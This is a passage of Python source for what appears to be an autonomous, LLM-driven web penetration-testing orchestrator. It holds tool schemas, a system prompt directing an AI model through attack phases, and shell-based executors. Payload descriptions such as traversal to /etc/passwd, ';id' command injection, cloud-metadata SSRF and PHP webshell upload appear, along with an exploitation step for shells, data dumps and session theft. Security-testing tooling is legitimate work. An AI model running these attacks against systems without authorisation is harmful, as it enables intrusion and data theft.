"""
modules/agent/_core.py
tmrswrr Agent - Tool-use based autonomous web pentest orchestrator (tool-use pattern)
"""
import json
import os
import re
import shlex
import shutil
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path
from types import SimpleNamespace

try:
    import anthropic
    _HAS_ANTHROPIC = True
except ImportError:
    _HAS_ANTHROPIC = False

try:
    import requests as _requests  # noqa: F401  - availability probe, not called directly
    _HAS_REQUESTS = True
except ImportError:
    _HAS_REQUESTS = False

from config.settings import OUTPUT_DIR, SESSION, add_vuln, save_session
from modules.agent.backends import (
    _best_model,
    _gemini_chat,
    _get_ollama_models,
    _ollama_chat_stream,
    _ollama_generate,
    _openai_chat,
    web_search_cve,
    web_search_ddg,
)
from modules.agent.constants import (
    AGENT_CYAN,
    AGENT_GREEN,
    AGENT_TEXT,
    LOG_DIR,
    MAX_ROUNDS,
    MAX_TOKENS,
    MODEL,
    OLLAMA_API_TIMEOUT,
)
from modules.agent.knowledge import (
    kb_get_target_context,
    kb_increment_run,
    kb_record_finding,
    kb_record_target,
    kb_summary,
)
from modules.agent.logger import AgentMarkdownLog
from utils.helpers import (
    BOLD,
    DIM,
    NEON_CYN,
    NEON_GRN,
    NEON_RED,
    NEON_YEL,
    PURE_WHITE,
    RST,
    SOFT_WHITE,
    error,
    info,
    pause,
    print_banner,
    prompt,
    run_cmd,
    section,
    success,
    warn,
)

# ── Tool definitions (Anthropic tool_use format) ──────────────────────────────

TOOLS = [
    {
        "name": "recon_target",
        "description": (
            "Perform initial reconnaissance on the target URL. "
            "Runs curl -I to grab HTTP headers, checks server info, and runs whatweb if available. "
            "Use this first to understand the technology stack."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "The full target URL (e.g. https://example.com)",
                },
            },
            "required": ["url"],
        },
    },
    {
        "name": "directory_scan",
        "description": (
            "Discover hidden directories and files using gobuster or ffuf. "
            "Finds admin panels, backup files, API endpoints, and other sensitive paths."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Base URL to scan"},
                "wordlist": {
                    "type": "string",
                    "description": "Wordlist path or name (common/big/medium). Defaults to common.",
                    "default": "common",
                },
                "extensions": {
                    "type": "string",
                    "description": "Comma-separated file extensions to append (e.g. php,html,txt)",
                    "default": "",
                },
            },
            "required": ["url"],
        },
    },
    {
        "name": "check_security_headers",
        "description": (
            "Analyze HTTP response headers for missing or misconfigured security headers. "
            "Checks CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, etc."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "URL to check headers for"},
            },
            "required": ["url"],
        },
    },
    {
        "name": "find_sensitive_files",
        "description": (
            "Probe for sensitive exposed files: .env, .git/config, backup files, "
            "actuator endpoints, debug files, configuration files, source code. "
            "Returns only paths that returned HTTP 200."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Base URL to probe"},
            },
            "required": ["url"],
        },
    },
    {
        "name": "test_sql_injection",
        "description": (
            "Test for SQL injection vulnerabilities using sqlmap with --batch mode. "
            "Can test GET/POST parameters automatically."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL, include GET params if known"},
                "data": {
                    "type": "string",
                    "description": "POST data string (e.g. 'user=admin&pass=test'). Leave empty for GET.",
                    "default": "",
                },
                "level": {
                    "type": "integer",
                    "description": "sqlmap level 1-5 (1=safe/fast, 5=thorough/slow)",
                    "default": 1,
                },
            },
            "required": ["url"],
        },
    },
    {
        "name": "test_xss",
        "description": (
            "Test for Cross-Site Scripting (XSS) vulnerabilities. "
            "Uses dalfox if available, otherwise tries basic payloads with curl."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL to test for XSS"},
            },
            "required": ["url"],
        },
    },
    {
        "name": "test_ssrf",
        "description": (
            "Test for Server-Side Request Forgery (SSRF). "
            "Probes internal addresses (127.0.0.1, 169.254.169.254 cloud metadata) via a URL parameter."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL"},
                "param": {
                    "type": "string",
                    "description": "Parameter name that accepts a URL (e.g. 'url', 'redirect', 'next')",
                    "default": "url",
                },
            },
            "required": ["url"],
        },
    },
    {
        "name": "test_path_traversal",
        "description": (
            "Test for path traversal / directory traversal vulnerabilities. "
            "Tries ../../../etc/passwd and encoded variants via a specified parameter."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL"},
                "param": {
                    "type": "string",
                    "description": "Parameter name to inject traversal payload into (e.g. 'file', 'page', 'path')",
                    "default": "file",
                },
            },
            "required": ["url"],
        },
    },
    {
        "name": "test_command_injection",
        "description": (
            "Test for OS command injection vulnerabilities. "
            "Tries ;id, |id, backtick execution and time-based blind injection payloads."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL"},
                "param": {
                    "type": "string",
                    "description": "Parameter name to inject commands into (e.g. 'cmd', 'host', 'ip')",
                    "default": "cmd",
                },
            },
            "required": ["url"],
        },
    },
    {
        "name": "test_authentication",
        "description": (
            "Test authentication mechanisms. Can brute force with common creds, "
            "test for default credentials, check JWT weaknesses, or test for account lockout."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL (base or login endpoint)"},
                "test_type": {
                    "type": "string",
                    "description": "Type of auth test: 'default_creds', 'brute_force', 'jwt', 'lockout'",
                    "default": "default_creds",
                },
                "endpoint": {
                    "type": "string",
                    "description": "Login endpoint path (e.g. /login, /api/auth). Auto-detected if blank.",
                    "default": "",
                },
                "username_param": {
                    "type": "string",
                    "description": "Username field name",
                    "default": "username",
                },
                "password_param": {
                    "type": "string",
                    "description": "Password field name",
                    "default": "password",
                },
            },
            "required": ["url"],
        },
    },
    {
        "name": "scan_vulnerabilities",
        "description": (
            "Run a broad vulnerability scan using nikto. "
            "Identifies outdated software, dangerous HTTP methods, default files, and misconfigurations."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL to scan with nikto"},
            },
            "required": ["url"],
        },
    },
    {
        "name": "check_ssl_tls",
        "description": (
            "Check SSL/TLS configuration for weaknesses. "
            "Tests for weak ciphers, old protocols (SSLv3, TLS 1.0), certificate issues, BEAST, POODLE, Heartbleed."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "host": {
                    "type": "string",
                    "description": "Hostname or IP (without https://). Port can be appended as host:port.",
                },
            },
            "required": ["host"],
        },
    },
    {
        "name": "test_ssti",
        "description": (
            "Test for Server-Side Template Injection (SSTI). "
            "Probes {{7*7}}, ${7*7}, #{7*7} and checks if the response contains '49'."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL"},
                "param": {
                    "type": "string",
                    "description": "Parameter name to inject template payloads into",
                    "default": "q",
                },
            },
            "required": ["url"],
        },
    },
    {
        "name": "report_finding",
        "description": (
            "Record a confirmed vulnerability finding. Call this immediately when you confirm a vuln. "
            "Do NOT call this for suspected or potential issues - only confirmed ones."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "title": {"type": "string", "description": "Short descriptive title"},
                "severity": {
                    "type": "string",
                    "description": "Severity: Critical, High, Medium, Low, or Info",
                    "enum": ["Critical", "High", "Medium", "Low", "Info"],
                },
                "owasp": {
                    "type": "string",
                    "description": "OWASP category (e.g. A03:2021 - Injection)",
                    "default": "",
                },
                "description": {
                    "type": "string",
                    "description": "Detailed description of the vulnerability and evidence",
                },
                "url": {
                    "type": "string",
                    "description": "Affected URL",
                    "default": "",
                },
                "remediation": {
                    "type": "string",
                    "description": "Recommended fix",
                    "default": "",
                },
            },
            "required": ["title", "severity", "description"],
        },
    },
    {
        "name": "finish_assessment",
        "description": (
            "End the security assessment. Call this when all major OWASP categories have been tested "
            "or there is no more meaningful attack surface to explore."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "summary": {
                    "type": "string",
                    "description": "Brief summary of what was tested and overall risk level",
                },
            },
            "required": ["summary"],
        },
    },
    {
        "name": "analyze_source_code",
        "description": (
            "Run SAST (Static Application Security Testing) on a source code directory. "
            "Analyzes code for SQLi, XSS, RCE, SSRF, Path Traversal, JWT, IDOR, Business Logic, "
            "Missing Auth, XXE, GraphQL, SSTI vulnerabilities using automated code review. "
            "Use when source code is available to find vulnerabilities before dynamic testing "
            "or to confirm dynamic findings at the code level."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "code_path": {
                    "type": "string",
                    "description": "Absolute path to the source code directory to analyze",
                },
                "skill": {
                    "type": "string",
                    "description": (
                        "Which SAST skill to run. Use 'all' for complete scan or a specific "
                        "skill: architecture, sqli, xss, ssrf, rce, xxe, pathtraversal, "
                        "ssti, jwt, idor, missingauth, businesslogic, graphql, report"
                    ),
                    "default": "all",
                },
            },
            "required": ["code_path"],
        },
    },
    {
        "name": "crawl_target",
        "description": (
            "Crawl the target to discover all pages, forms, links, JS endpoints, and API paths. "
            "Run this early - discovered endpoints feed into all subsequent tests. "
            "Finds login pages, upload forms, admin panels, API routes, GraphQL endpoints."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Base URL to crawl"},
                "depth": {
                    "type": "integer",
                    "description": "Crawl depth (1=homepage only, 2=follow links, 3=deep)",
                    "default": 2,
                },
            },
            "required": ["url"],
        },
    },
    {
        "name": "test_cors",
        "description": (
            "Test for CORS misconfiguration. Checks if the server reflects arbitrary Origins, "
            "allows credentials from untrusted origins, permits null origin, or has wildcards "
            "with credentials - all exploitable for cross-site data theft."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL to test CORS headers"},
            },
            "required": ["url"],
        },
    },
    {
        "name": "test_xxe",
        "description": (
            "Test for XML External Entity (XXE) injection. Tries to read /etc/passwd via "
            "SYSTEM entity, blind XXE via DNS/HTTP callback, and XXE via SVG/Office file upload. "
            "Targets any endpoint accepting XML, SOAP, or multipart XML."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL (base or XML-consuming endpoint)"},
                "endpoint": {
                    "type": "string",
                    "description": "Specific XML endpoint path (e.g. /api/upload, /soap/endpoint)",
                    "default": "",
                },
            },
            "required": ["url"],
        },
    },
    {
        "name": "test_open_redirect",
        "description": (
            "Test for Open Redirect vulnerabilities. Checks common redirect parameters "
            "(url, redirect, next, return, goto, dest, r, ref, link, continue) for "
            "absolute URL redirection to attacker-controlled domains."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL"},
                "endpoints": {
                    "type": "string",
                    "description": "Comma-separated endpoints to test (e.g. /login,/logout,/redirect)",
                    "default": "",
                },
            },
            "required": ["url"],
        },
    },
    {
        "name": "test_file_upload",
        "description": (
            "Test file upload endpoints for security bypasses. Tries PHP webshell upload, "
            "extension bypass (.php.jpg, .phtml, .php5), null byte injection, MIME type bypass, "
            "content-type mismatch, and double extension attacks."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL (base or upload endpoint)"},
                "upload_path": {
                    "type": "string",
                    "description": "Upload endpoint path (e.g. /upload, /api/files, /profile/avatar)",
                    "default": "",
                },
            },
            "required": ["url"],
        },
    },
    {
        "name": "fuzz_parameters",
        "description": (
            "Discover hidden GET and POST parameters using arjun or a manual probe list. "
            "Finds parameters not visible in source code - debug flags, admin params, "
            "undocumented API fields - which can then be tested for injection vulnerabilities."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL to fuzz parameters on"},
                "method": {
                    "type": "string",
                    "description": "HTTP method to use: GET or POST",
                    "default": "GET",
                    "enum": ["GET", "POST"],
                },
            },
            "required": ["url"],
        },
    },
    {
        "name": "test_graphql",
        "description": (
            "Test GraphQL endpoints for security issues. Checks for introspection enabled "
            "(schema disclosure), batch query attacks, injection in query variables, "
            "missing auth on mutations, and field suggestion attacks."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL or GraphQL endpoint"},
                "endpoint": {
                    "type": "string",
                    "description": "GraphQL endpoint path (e.g. /graphql, /api/graphql)",
                    "default": "/graphql",
                },
            },
            "required": ["url"],
        },
    },
    {
        "name": "nuclei_scan",
        "description": (
            "Run nuclei template-based vulnerability scanner. Covers 1000s of CVEs, "
            "misconfigurations, exposed panels, default credentials, and tech-specific vulns. "
            "Very broad coverage - run after recon. Use severity medium-critical for speed."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL to scan with nuclei"},
                "severity": {
                    "type": "string",
                    "description": "Minimum severity to report: low, medium, high, critical",
                    "default": "medium",
                },
                "tags": {
                    "type": "string",
                    "description": "Optional comma-separated tags to focus on (e.g. sqli,xss,rce,cve)",
                    "default": "",
                },
            },
            "required": ["url"],
        },
    },
    {
        "name": "generate_report",
        "description": (
            "Generate a professional HTML security assessment report with all findings, "
            "CVSS v3.1 scores, OWASP classification, and remediation recommendations. "
            "Call this at the end of the assessment or any time findings need to be documented."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "title": {
                    "type": "string",
                    "description": "Report title (e.g. 'Web Application Security Assessment')",
                    "default": "Web Application Security Assessment",
                },
            },
            "required": [],
        },
    },
    {
        "name": "web_search",
        "description": (
            "Search the web for CVE information, exploit PoCs, technology advisories, "
            "or attack techniques. Use to look up CVEs for detected software versions, "
            "find public exploits, or research specific vulnerability classes. "
            "Examples: 'Apache 2.4.49 CVE exploit', 'Spring4Shell PoC', 'WordPress 5.8 RCE'."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "query": {
                    "type": "string",
                    "description": "Search query (e.g. 'Apache 2.4.49 exploit CVE-2021-41773')",
                },
                "search_type": {
                    "type": "string",
                    "description": "Type: 'cve' for NVD CVE lookup, 'web' for general DuckDuckGo search",
                    "default": "web",
                    "enum": ["web", "cve"],
                },
            },
            "required": ["query"],
        },
    },
    {
        "name": "exploit_vulnerability",
        "description": (
            "Deep exploitation of a confirmed vulnerability. Takes a confirmed finding and "
            "attempts to escalate: SQLi → data dump, RCE → shell, SSRF → metadata, "
            "XSS → session steal PoC, path traversal → config file read. "
            "Call ONLY after a vulnerability has been confirmed by another tool."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Vulnerable URL"},
                "vuln_type": {
                    "type": "string",
                    "description": "Vulnerability type: sqli, rce, ssrf, xss, lfi, ssti, xxe",
                },
                "payload": {
                    "type": "string",
                    "description": "The confirmed payload or parameter that triggered the vuln",
                    "default": "",
                },
                "param": {
                    "type": "string",
                    "description": "Vulnerable parameter name",
                    "default": "",
                },
            },
            "required": ["url", "vuln_type"],
        },
    },
]

# ── System prompt ─────────────────────────────────────────────────────────────

def _analyze_result(result: str) -> dict:
    """
    Extract intelligence from a tool result to guide next actions.
    Returns rich hints dict used by _smart_next_tool.
    Also updates SESSION with discovered endpoints and parameters.
    """
    r = result.lower()

    # Extract discovered endpoints from crawl/dir scan output
    endpoints = re.findall(r'(?:https?://[^\s"\']+|/[a-zA-Z0-9/_\-\.?=&%]{3,})', result)
    endpoints = [e for e in endpoints if not any(x in e for x in ["jpg", "png", "gif", "css", "woff"])]
    if endpoints:
        existing = SESSION.get("agent_endpoints", [])
        new_eps  = [e for e in endpoints if e not in existing]
        SESSION["agent_endpoints"] = (existing + new_eps)[:200]

    # Extract discovered parameters
    params = re.findall(r'[?&]([a-zA-Z_][a-zA-Z0-9_\-]{1,30})=', result)
    params += re.findall(r'"([a-zA-Z_][a-zA-Z0-9_\-]{1,30})"\s*:', result)  # JSON keys
    if params:
        existing_p = SESSION.get("agent_params", [])
        new_p = [p for p in params if p not in existing_p and p.lower() not in
                 ("true", "false", "null", "undefined", "content", "type", "name", "value")]
        SESSION["agent_params"] = (existing_p + new_p)[:100]

    # Upload endpoint detection
    upload_endpoints = re.findall(
        r'(/[a-zA-Z0-9/_\-]*(?:upload|file|attach|image|avatar|media|import)[a-zA-Z0-9/_\-]*)',
        result, re.I
    )
    if upload_endpoints:
        existing_u = SESSION.get("agent_upload_endpoints", [])
        SESSION["agent_upload_endpoints"] = list(set(existing_u + upload_endpoints))[:20]

    return {
        # Tech stack
        "php":           any(x in r for x in ["php", ".php", "x-powered-by: php", "phpsessid"]),
        "asp":           any(x in r for x in ["asp", ".aspx", "x-aspnet", "asp.net"]),
        "java":          any(x in r for x in ["java", "spring", "tomcat", ".jsp", "jsessionid"]),
        "node":          any(x in r for x in ["node", "express", "next.js", "nuxt", "nestjs"]),
        "python":        any(x in r for x in ["flask", "django", "fastapi", "wsgi", "python"]),
        "ruby":          any(x in r for x in ["ruby", "rails", "sinatra"]),

        # CMS / platform
        "wordpress":     any(x in r for x in ["wordpress", "wp-content", "wp-admin", "wp-login"]),
        "drupal":        any(x in r for x in ["drupal", "/sites/default", "drupalversion"]),
        "joomla":        any(x in r for x in ["joomla", "/administrator/", "joomla!"]),

        # Attack surface
        "login_found":   any(x in r for x in ["login", "password", "signin", "auth", "sign in", "log in"]),
        "api_found":     any(x in r for x in ["/api/", "graphql", "swagger", "rest", "/v1/", "/v2/"]),
        "graphql_found": any(x in r for x in ["graphql", "__schema", "__type", "query {", "mutation {"]),
        "upload_found":  bool(SESSION.get("agent_upload_endpoints")) or any(
                             x in r for x in ["upload", "file upload", "multipart/form-data", "enctype"]
                         ),
        "jwt_found":     bool(re.search(r'eyJ[a-zA-Z0-9_\-]{10,}\.eyJ', result)),
        "xml_endpoint":  any(x in r for x in ["application/xml", "text/xml", "soap", "wsdl", "xmlns"]),

        # Discovery state
        "has_params":    bool(SESSION.get("agent_params")) or ("?" in result and "=" in result),
        "endpoints_found": bool(SESSION.get("agent_endpoints", [])),

        # Vulnerability hints
        "sqli_error":    any(x in r for x in ["sql syntax", "mysql_fetch", "ora-", "sqlite",
                                               "syntax error", "unclosed quotation", "mysql error"]),
        "vuln_confirmed":any(x in r for x in ["uid=", "root:", "root:x:", "/etc/passwd",
                                               "error in your sql", "xss-test-12345",
                                               "ami-id", "instance-id", "confirmed"]),
        "waf_detected":  any(x in r for x in ["blocked", "forbidden", "waf", "firewall",
                                               "cloudflare", "akamai", "403 forbidden"]),
        "sensitive_exposed": any(x in r for x in [".env", ".git", "phpinfo", "actuator",
                                                    "swagger", "api_key", "secret", "password"]),
        "nuclei_done":   "nuclei" in r and ("finding" in r or "template" in r or "match" in r),
    }


def _smart_next_tool(completed: list, target: str, hints: dict) -> tuple[str, dict]:
    """
    6-phase context-aware tool selector.
    Adapts strategy based on discovered endpoints, tech stack, and confirmed findings.
    """
    done = set(completed)
    host = target.split("//")[-1].split("/")[0]
    endpoints = SESSION.get("agent_endpoints", [])
    params    = SESSION.get("agent_params", [])

    # ── Priority 0: Pending deep exploit (triggered by confirmation) ──────────
    pending = SESSION.pop("_pending_exploit", None)
    if pending and "exploit_vulnerability" not in done:
        return "exploit_vulnerability", pending

    # ── Priority 0b: Web search after recon (look up CVEs for found tech) ────
    if "recon_target" in done and "web_search" not in done:
        tech_list = [k for k in ["apache","nginx","iis","php","spring","wordpress","drupal","joomla"]
                     if k in str(SESSION.get("agent_endpoints", []) + [""]).lower()]
        if tech_list:
            return "web_search", {"query": f"{tech_list[0]} vulnerability exploit CVE 2024",
                                   "search_type": "cve"}

    # ── Phase 1: Baseline reconnaissance (always first 3) ─────────────────────
    if "recon_target" not in done:
        return "recon_target", {"url": target}
    if "check_security_headers" not in done:
        return "check_security_headers", {"url": target}
    if "find_sensitive_files" not in done:
        return "find_sensitive_files", {"url": target}

    # ── Phase 2: Intelligence gathering (crawl + nuclei early) ────────────────
    if "crawl_target" not in done:
        return "crawl_target", {"url": target, "depth": 2}

    if "nuclei_scan" not in done:
        return "nuclei_scan", {"url": target, "severity": "medium"}

    if "directory_scan" not in done:
        ext = "php,html,txt,bak" if hints.get("php") else "json,yml,html,txt"
        return "directory_scan", {"url": target, "extensions": ext}

    # ── Phase 3: Context-driven high-value attacks ─────────────────────────────

    # WordPress → dedicated CMS scanner
    if hints.get("wordpress") and "scan_vulnerabilities" not in done:
        return "scan_vulnerabilities", {"url": target}

    # Login found → auth testing (highest priority - credentials = full access)
    if hints.get("login_found") and "test_authentication" not in done:
        ep = next((e for e in endpoints if any(x in e for x in ["/login", "/signin", "/auth"])), "/login")
        return "test_authentication", {"url": target, "test_type": "default_creds", "endpoint": ep}

    # GraphQL found → test it immediately (often unprotected)
    if hints.get("graphql_found") and "test_graphql" not in done:
        gql_ep = next((e for e in endpoints if "graphql" in e.lower()), "/graphql")
        return "test_graphql", {"url": target, "endpoint": gql_ep}

    # JWT found → algorithm confusion / none / weak secret
    if hints.get("jwt_found") and "test_authentication" in done:
        if "test_jwt_attacks" not in done:
            # We'll handle JWT via test_authentication with jwt type
            if completed.count("test_authentication") < 2:
                return "test_authentication", {"url": target, "test_type": "jwt"}

    # XML endpoints found → XXE
    if hints.get("xml_endpoint") and "test_xxe" not in done:
        return "test_xxe", {"url": target}

    # File upload found → immediate test (high impact)
    if hints.get("upload_found") and "test_file_upload" not in done:
        upload_ep = (SESSION.get("agent_upload_endpoints") or ["/upload"])[0]
        return "test_file_upload", {"url": target, "upload_path": upload_ep}

    # SAST - if code available, run after initial surface mapping
    code_path = SESSION.get("sast_target", "")
    if code_path and os.path.isdir(code_path) and "analyze_source_code" not in done:
        return "analyze_source_code", {"code_path": code_path, "skill": "all"}

    # SQLi hint from error messages → prioritize SQLi
    if hints.get("sqli_error") and "test_sql_injection" not in done:
        return "test_sql_injection", {"url": target}

    # ── Phase 4: Systematic OWASP Top 10 coverage ─────────────────────────────
    # Pick first undone test from comprehensive list
    param_best = params[0] if params else "q"

    owasp_coverage = [
        # A03 - Injection
        ("test_sql_injection",    {"url": target}),
        ("test_xss",              {"url": target}),
        ("test_command_injection",{"url": target, "param": param_best}),
        ("test_ssti",             {"url": target, "param": param_best}),
        ("test_xxe",              {"url": target}),

        # A01 - Broken Access Control
        ("test_path_traversal",   {"url": target, "param": "file"}),
        ("test_open_redirect",    {"url": target}),

        # A02 - Crypto Failures
        ("check_ssl_tls",         {"host": host}),

        # A05 - Security Misconfiguration
        ("test_cors",             {"url": target}),

        # A07 - Auth Failures
        ("test_authentication",   {"url": target, "test_type": "lockout", "endpoint": "/login"}),

        # A10 - SSRF
        ("test_ssrf",             {"url": target, "param": "url"}),

        # File upload
        ("test_file_upload",      {"url": target}),

        # Broad vuln scanner
        ("scan_vulnerabilities",  {"url": target}),

        # Parameter fuzzing (find hidden attack surface)
        ("fuzz_parameters",       {"url": target, "method": "GET"}),
    ]

    for tool_name, args in owasp_coverage:
        if tool_name not in done:
            return tool_name, args

    # ── Phase 5: SAST report consolidation ────────────────────────────────────
    if code_path and "analyze_source_code" in done:
        if not SESSION.get("_sast_report_done"):
            SESSION["_sast_report_done"] = True
            return "analyze_source_code", {"code_path": code_path, "skill": "report"}

    # ── Phase 6: Generate HTML report + finish ────────────────────────────────
    if "generate_report" not in done:
        return "generate_report", {"title": "Web Application Security Assessment"}

    return "finish_assessment", {
        "summary": (
            f"Assessment complete. {len(done)} tools executed against {target}. "
            f"Findings: {len(SESSION.get('vulns_found', []))} vulnerabilities recorded."
        )
    }


def _build_ollama_prompt(target: str, completed: list, last_result: str,
                          hints: dict | None = None) -> str:
    """
    Concise, focused prompt - small context = fast inference.
    Uses smart suggestion so Ollama just needs to confirm, not reason.
    """
    hints = hints or {}
    done_str = ", ".join(completed[-6:]) if completed else "none"
    findings_count = len(SESSION.get("vulns_found", []))

    # Smart suggestion - context-aware
    suggested_tool, suggested_args = _smart_next_tool(completed, target, hints)

    # Result summary - keep tiny (1-2 most interesting lines)
    result_summary = ""
    if last_result:
        lines = [l.strip() for l in last_result.splitlines() if l.strip()]
        meaningful = [l for l in lines if any(x in l.lower() for x in
                      ["found", "confirmed", "error", "vuln", "200", "missing",
                       "php", "login", "upload", "graphql", "jwt", "cors"])]
        result_summary = " | ".join((meaningful[:2] if meaningful else lines[:2]))[:150]

    # Context hints for the model
    context_bits = []
    if hints.get("login_found"):   context_bits.append("login form found")
    if hints.get("graphql_found"): context_bits.append("GraphQL detected")
    if hints.get("upload_found"):  context_bits.append("upload endpoint found")
    if hints.get("wordpress"):     context_bits.append("WordPress")
    if hints.get("jwt_found"):     context_bits.append("JWT detected")
    context_str = ", ".join(context_bits) if context_bits else "no special findings"

    # Serialize suggested args for the prompt
    args_json = json.dumps(suggested_args)

    return f"""Web pentest: {target}
Done({len(completed)}): {done_str}
Context: {context_str} | Findings: {findings_count}
Last: {result_summary or "none"}
Suggested: {suggested_tool}

Reply ONLY with this JSON, no text:
{{"tool":"{suggested_tool}","args":{args_json}}}"""


def _parse_ollama_tool_call(text: str) -> tuple[str, dict]:
    """
    Extract tool name and args from Ollama's JSON response.
    Returns (tool_name, args_dict) or ("", {}) if parsing fails.
    """
    if not text:
        return "", {}

    # Try to find JSON object in the response
    import re
    # First try: entire response is JSON
    text = text.strip()

    # Strip markdown code fences if present
    text = re.sub(r"```json\s*", "", text)
    text = re.sub(r"```\s*", "", text)
    text = text.strip()

    # Find first { ... } block
    match = re.search(r'\{[^{}]*"tool"\s*:\s*"([^"]+)"[^{}]*\}', text, re.S)
    if match:
        try:
            data = json.loads(match.group(0))
            tool = data.get("tool", "")
            args = data.get("args", {})
            if isinstance(args, dict):
                return tool, args
        except json.JSONDecodeError:
            pass

    # Wider search: any JSON object
    for m in re.finditer(r'\{.*?\}', text, re.S):
        try:
            data = json.loads(m.group(0))
            if "tool" in data:
                return data["tool"], data.get("args", {})
        except json.JSONDecodeError:
            continue

    # Last resort: extract tool name from text
    for t in TOOLS:
        if t["name"] in text:
            return t["name"], {}

    return "", {}


def _rule_based_next_tool(completed: list, target: str) -> tuple[str, dict]:
    """Fallback: pick next tool based on what has/hasn't been run yet."""
    sequence = [
        "recon_target",
        "check_security_headers",
        "find_sensitive_files",
        "directory_scan",
        "test_sql_injection",
        "test_xss",
        "test_ssrf",
        "test_path_traversal",
        "test_command_injection",
        "test_authentication",
        "scan_vulnerabilities",
        "check_ssl_tls",
        "test_ssti",
        "finish_assessment",
    ]
    for tool_name in sequence:
        if tool_name not in completed:
            return tool_name, {"url": target}
    return "finish_assessment", {"summary": "All tools completed"}


# Keep legacy string for reference
OLLAMA_SYSTEM = "web pentest agent"


def _build_claude_system() -> str:
    target    = SESSION.get("target_url", "unknown")
    engagement= SESSION.get("engagement", "Web Pentest")
    cookies   = bool(SESSION.get("cookies"))
    auth      = bool(SESSION.get("auth_token") or SESSION.get("username"))
    code_path = SESSION.get("sast_target", "")
    sast_note = f"\nSOURCE CODE: {code_path} - run analyze_source_code during assessment" if code_path and os.path.isdir(code_path) else ""
    return f"""You are YeepForge Agent - an expert web application penetration tester with full OWASP Top 10 coverage.

ENGAGEMENT: {engagement}
TARGET: {target}
AUTHENTICATED: {auth} (cookies set: {cookies}){sast_note}

RULES:
1. Call EXACTLY one tool per turn. Never respond with plain text only.
2. Follow this optimal sequence:
   Phase 1 (Baseline):   recon_target → check_security_headers → find_sensitive_files
   Phase 2 (Discovery):  crawl_target → nuclei_scan → directory_scan
   Phase 3 (Context):    Prioritize based on findings - login→test_authentication,
                         GraphQL→test_graphql, upload→test_file_upload, XML→test_xxe
   Phase 4 (OWASP):      test_sql_injection, test_xss, test_cors, test_ssrf,
                         test_command_injection, test_ssti, test_xxe, test_open_redirect,
                         test_path_traversal, check_ssl_tls, test_file_upload, fuzz_parameters
   Phase 5 (SAST):       analyze_source_code (if source code available)
   Phase 6 (Close):      generate_report → finish_assessment
3. Call report_finding IMMEDIATELY when a tool output confirms a vulnerability.
4. Use discovered endpoints and parameters from crawl_target in subsequent tests.
5. Call generate_report before finish_assessment to create the HTML output.
6. Cover all OWASP Top 10 categories before finishing."""


# ── Tool executor functions ───────────────────────────────────────────────────

def _safe_url(url: str) -> str:
    """Shell-quote a URL."""
    return shlex.quote(url)


def _run(cmd: str, timeout: int = 90) -> str:
    """Run a shell command, return combined stdout+stderr, truncated to 6000 chars."""
    out, err, rc = run_cmd(cmd, timeout=timeout)
    combined = (out or "") + ("\n" + err if err else "")
    combined = combined.strip() or "(no output)"
    if len(combined) > 6000:
        combined = combined[:6000] + "\n... (truncated)"
    return combined


def _curl_flags() -> str:
    """Build reusable curl flags injecting session cookies/proxy."""
    flags = "-sk"
    cookies = SESSION.get("cookies", "")
    proxy   = SESSION.get("proxy", "")
    if cookies:
        flags += f" -b {shlex.quote(cookies)}"
    if proxy:
        flags += f" --proxy {shlex.quote(proxy)}"
    return flags


#: Response headers that name the stack. Recorded so the report can state what
#: was tested instead of printing "Tech: N/A" after a successful fingerprint.
_TECH_HEADERS = ("server", "x-powered-by", "x-aspnet-version",
                 "x-aspnetmvc-version", "x-generator", "x-drupal-cache")


def _record_tech(headers_text: str) -> None:
    stack = SESSION.setdefault("tech_stack", [])
    for line in headers_text.splitlines():
        name, _, value = line.partition(":")
        if name.strip().lower() in _TECH_HEADERS:
            item = f"{name.strip()}: {value.strip()}"
            if value.strip() and item not in stack:
                stack.append(item)


def tool_recon_target(url: str, **_) -> str:
    cf = _curl_flags()
    headers = _run(f"curl {cf} -I --max-time 15 {_safe_url(url)}")
    _record_tech(headers)
    lines = [f"=== curl -I {url} ===", headers]
    if shutil.which("whatweb"):
        lines.append("\n=== whatweb ===")
        lines.append(_run(f"whatweb --color=never {_safe_url(url)} 2>&1", timeout=30))
    if shutil.which("wafw00f"):
        lines.append("\n=== wafw00f (WAF detection) ===")
